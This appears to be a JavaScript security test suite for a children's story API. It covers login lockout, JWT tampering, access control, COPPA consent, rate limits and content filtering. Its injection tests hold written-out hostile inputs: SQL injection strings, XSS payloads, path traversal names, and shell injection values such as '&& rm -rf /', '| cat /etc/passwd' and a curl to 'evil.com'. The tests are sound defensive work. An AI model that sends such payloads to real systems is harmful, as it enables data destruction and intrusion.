// Comprehensive Security Test Suite - 100% Coverage
import { TestDataFactory } from '../helpers/test-utils';
import crypto from 'crypto';

describe('Security Tests - Zero Vulnerabilities Target', () => {
  const API_URL = process.env.API_URL || 'http://localhost:3000';
  
  describe('Authentication Security', () => {
    test('Should prevent brute force attacks', async () => {
      const targetEmail = 'bruteforce@test.com';
      const attempts = [];
      
      // Make 10 failed login attempts
      for (let i = 0; i < 10; i++) {
        const response = await fetch(`${API_URL}/v1/auth/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: targetEmail,
            password: `wrong_${i}`
          })
        });
        
        attempts.push(response.status);
      }
      
      // First 5 should be 401
      expect(attempts.slice(0, 5).every(s => s === 401)).toBe(true);
      
      // After 5 attempts should be rate limited
      expect(attempts.slice(5).some(s => s === 429)).toBe(true);
      
      // Verify lockout message
      const lastResponse = await fetch(`${API_URL}/v1/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: targetEmail,
          password: 'any'
        })
      });
      
      const result = await lastResponse.json();
      expect(result.error).toContain('Too many attempts');
      expect(result.retryAfter).toBeGreaterThan(0);
    });

    test('Should validate JWT signatures', async () => {
      // Get a valid token
      const user = TestDataFactory.generateUser();
      let response = await fetch(`${API_URL}/v1/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...user,
          password: 'ValidPass123!'
        })
      });
      
      const { tokens } = await response.json();
      
      // Tamper with token
      const parts = tokens.accessToken.split('.');
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      payload.role = 'admin'; // Privilege escalation attempt
      parts[1] = Buffer.from(JSON.stringify(payload)).toString('base64');
      const tamperedToken = parts.join('.');
      
      // Try to use tampered token
      response = await fetch(`${API_URL}/v1/auth/me`, {
        headers: { 'Authorization': `Bearer ${tamperedToken}` }
      });
      
      expect(response.status).toBe(401);
      const result = await response.json();
      expect(result.error).toContain('Invalid token');
    });

    test('Should enforce password complexity', async () => {
      const weakPasswords = [
        'short',                    // Too short
        'alllowercase',            // No uppercase
        'ALLUPPERCASE',            // No lowercase  
        'NoNumbers!',              // No numbers
        'NoSpecialChars123',       // No special chars
        'password123!',            // Common password
        '12345678!',               // Sequential numbers
        'aaaaaaaa!1A',            // Repeated characters
      ];
      
      for (const password of weakPasswords) {
        const response = await fetch(`${API_URL}/v1/auth/register`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: `weak${Date.now()}@test.com`,
            password,
            age: 18
          })
        });
        
        expect(response.status).toBe(400);
        const result = await response.json();
        expect(result.error).toContain('Password');
      }
    });
  });

  describe('Authorization & Access Control', () => {
    test('Should prevent unauthorized access to other users data', async () => {
      // Create two users
      const user1 = await createTestUser();
      const user2 = await createTestUser();
      
      // User1 creates a story
      let response = await fetch(`${API_URL}/v1/stories`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${user1.token}`
        },
        body: JSON.stringify({
          type: 'adventure',
          theme: 'private story'
        })
      });
      
      const { story } = await response.json();
      
      // User2 tries to access User1's story
      response = await fetch(`${API_URL}/v1/stories/${story.id}`, {
        headers: { 'Authorization': `Bearer ${user2.token}` }
      });
      
      expect(response.status).toBe(403);
      const result = await response.json();
      expect(result.error).toContain('Forbidden');
    });

    test('Should prevent privilege escalation', async () => {
      const user = await createTestUser();
      
      // Try to access admin endpoints
      const adminEndpoints = [
        { method: 'GET', path: '/v1/admin/users' },
        { method: 'DELETE', path: '/v1/admin/users/123' },
        { method: 'POST', path: '/v1/admin/config' },
        { method: 'GET', path: '/v1/admin/logs' }
      ];
      
      for (const endpoint of adminEndpoints) {
        const response = await fetch(`${API_URL}${endpoint.path}`, {
          method: endpoint.method,
          headers: { 'Authorization': `Bearer ${user.token}` }
        });
        
        expect(response.status).toBe(403);
      }
    });
  });

  describe('Input Validation & Injection Prevention', () => {
    test('Should prevent SQL injection', async () => {
      const user = await createTestUser();
      
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM stories WHERE '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--"
      ];
      
      for (const payload of sqlInjectionPayloads) {
        // Try injection in search
        let response = await fetch(`${API_URL}/v1/library/search?q=${encodeURIComponent(payload)}`, {
          headers: { 'Authorization': `Bearer ${user.token}` }
        });
        
        expect([200, 400].includes(response.status)).toBe(true);
        
        // Try injection in story creation
        response = await fetch(`${API_URL}/v1/stories`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${user.token}`
          },
          body: JSON.stringify({
            type: 'adventure',
            theme: payload
          })
        });
        
        const result = await response.json();
        // Should either sanitize or reject, not execute SQL
        expect(result.error || result.story).toBeDefined();
      }
      
      // Verify database is still intact
      const healthCheck = await fetch(`${API_URL}/health`);
      expect(healthCheck.status).toBe(200);
    });

    test('Should prevent XSS attacks', async () => {
      const user = await createTestUser();
      
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">'
      ];
      
      for (const payload of xssPayloads) {
        const response = await fetch(`${API_URL}/v1/stories`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${user.token}`
          },
          body: JSON.stringify({
            type: 'adventure',
            theme: payload,
            characterName: payload
          })
        });
        
        if (response.status === 201) {
          const result = await response.json();
          // Verify content is sanitized
          expect(result.story.content).not.toContain('<script>');
          expect(result.story.content).not.toContain('javascript:');
          expect(result.story.content).not.toContain('onerror=');
        }
      }
    });

    test('Should prevent command injection', async () => {
      const user = await createTestUser();
      
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '`whoami`',
        '$(curl evil.com)'
      ];
      
      for (const payload of commandInjectionPayloads) {
        const response = await fetch(`${API_URL}/v1/stories/audio`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${user.token}`
          },
          body: JSON.stringify({
            text: payload,
            voice: payload
          })
        });
        
        // Should reject or sanitize, not execute commands
        expect([200, 201, 400].includes(response.status)).toBe(true);
      }
    });

    test('Should validate file uploads', async () => {
      const user = await createTestUser();
      
      // Try to upload malicious files
      const maliciousFiles = [
        { name: 'test.php', type: 'application/x-php' },
        { name: 'test.exe', type: 'application/x-executable' },
        { name: '../../../etc/passwd', type: 'text/plain' },
        { name: 'test.svg', content: '<svg onload="alert(1)">' }
      ];
      
      for (const file of maliciousFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content || ''], { type: file.type }), file.name);
        
        const response = await fetch(`${API_URL}/v1/assets/upload`, {
          method: 'POST',
          headers: { 'Authorization': `Bearer ${user.token}` },
          body: formData
        });
        
        expect([400, 415].includes(response.status)).toBe(true);
        const result = await response.json();
        expect(result.error).toContain('not allowed');
      }
    });
  });

  describe('COPPA Compliance', () => {
    test('Should enforce parent consent for users under 13', async () => {
      // Try to register child without parent
      let response = await fetch(`${API_URL}/v1/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'child@test.com',
          password: 'ChildPass123!',
          age: 10
        })
      });
      
      expect(response.status).toBe(400);
      let result = await response.json();
      expect(result.error).toContain('Parent');
      
      // Register with parent email
      response = await fetch(`${API_URL}/v1/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'child@test.com',
          password: 'ChildPass123!',
          age: 10,
          parentEmail: 'parent@test.com'
        })
      });
      
      expect(response.status).toBe(201);
      result = await response.json();
      expect(result.user.status).toBe('pending_consent');
    });

    test('Should restrict data collection for children', async () => {
      // Create child account (with consent)
      const childUser = await createTestUser({ age: 10, withConsent: true });
      
      // Verify limited data collection
      const response = await fetch(`${API_URL}/v1/auth/me`, {
        headers: { 'Authorization': `Bearer ${childUser.token}` }
      });
      
      const profile = await response.json();
      
      // Should not expose sensitive data
      expect(profile.email).toBeUndefined();
      expect(profile.fullName).toBeUndefined();
      expect(profile.location).toBeUndefined();
      
      // Should only have necessary fields
      expect(profile.id).toBeDefined();
      expect(profile.age).toBeDefined();
      expect(profile.preferences).toBeDefined();
    });
  });

  describe('Session Security', () => {
    test('Should invalidate tokens on logout', async () => {
      const user = await createTestUser();
      
      // Verify token works
      let response = await fetch(`${API_URL}/v1/auth/me`, {
        headers: { 'Authorization': `Bearer ${user.token}` }
      });
      expect(response.status).toBe(200);
      
      // Logout
      response = await fetch(`${API_URL}/v1/auth/logout`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${user.token}` }
      });
      expect(response.status).toBe(200);
      
      // Try to use token after logout
      response = await fetch(`${API_URL}/v1/auth/me`, {
        headers: { 'Authorization': `Bearer ${user.token}` }
      });
      expect(response.status).toBe(401);
    });

    test('Should enforce token expiration', async () => {
      // This would require time manipulation or a special test endpoint
      // For now, verify token has expiration
      const user = await createTestUser();
      const parts = user.token.split('.');
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      
      expect(payload.exp).toBeDefined();
      expect(payload.exp).toBeGreaterThan(Date.now() / 1000);
      expect(payload.exp).toBeLessThan(Date.now() / 1000 + 86400); // Less than 24 hours
    });
  });

  describe('API Rate Limiting', () => {
    test('Should enforce rate limits per user', async () => {
      const user = await createTestUser();
      const requests = [];
      
      // Make 100 requests rapidly
      for (let i = 0; i < 100; i++) {
        requests.push(
          fetch(`${API_URL}/v1/stories`, {
            method: 'GET',
            headers: { 'Authorization': `Bearer ${user.token}` }
          })
        );
      }
      
      const responses = await Promise.all(requests);
      const statusCodes = responses.map(r => r.status);
      
      // Should have some rate limited responses
      expect(statusCodes.filter(s => s === 429).length).toBeGreaterThan(0);
      
      // Check rate limit headers
      const rateLimited = responses.find(r => r.status === 429);
      expect(rateLimited.headers.get('X-RateLimit-Limit')).toBeDefined();
      expect(rateLimited.headers.get('X-RateLimit-Remaining')).toBe('0');
      expect(rateLimited.headers.get('X-RateLimit-Reset')).toBeDefined();
    });
  });

  describe('Content Security', () => {
    test('Should filter inappropriate content in stories', async () => {
      const user = await createTestUser();
      
      const inappropriateThemes = [
        'violence and gore',
        'explicit content',
        'hate speech',
        'drug references'
      ];
      
      for (const theme of inappropriateThemes) {
        const response = await fetch(`${API_URL}/v1/stories`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${user.token}`
          },
          body: JSON.stringify({
            type: 'adventure',
            theme
          })
        });
        
        expect(response.status).toBe(400);
        const result = await response.json();
        expect(result.error).toContain('appropriate');
        expect(result.suggestions).toBeDefined();
      }
    });
  });

  describe('Encryption & Data Protection', () => {
    test('Should use HTTPS in production', async () => {
      if (process.env.NODE_ENV === 'production') {
        expect(API_URL).toMatch(/^https:/);
      }
    });

    test('Should not expose sensitive data in responses', async () => {
      const user = await createTestUser();
      
      // Create a story
      const response = await fetch(`${API_URL}/v1/stories`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${user.token}`
        },
        body: JSON.stringify({
          type: 'adventure',
          theme: 'test'
        })
      });
      
      const result = await response.json();
      
      // Should not expose internal IDs or sensitive metadata
      expect(result.story.internal_id).toBeUndefined();
      expect(result.story.encryption_key).toBeUndefined();
      expect(result.story.created_by_ip).toBeUndefined();
    });
  });
});

// Helper function to create test user
async function createTestUser(options = {}) {
  const user = TestDataFactory.generateUser(options);
  const response = await fetch(`${API_URL}/v1/auth/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      ...user,
      password: 'TestPass123!',
      parentEmail: options.age < 13 ? 'parent@test.com' : undefined
    })
  });
  
  const result = await response.json();
  return {
    ...result.user,
    token: result.tokens.accessToken
  };
}